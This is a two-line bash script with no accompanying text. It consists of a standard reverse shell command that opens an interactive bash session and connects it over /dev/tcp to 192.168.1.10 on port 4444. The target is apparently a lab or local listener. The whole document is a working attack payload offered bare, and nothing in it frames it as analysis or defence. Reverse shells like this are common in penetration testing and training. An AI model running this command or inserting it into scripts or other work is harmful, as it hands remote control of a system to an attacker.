#!/bin/bash
bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
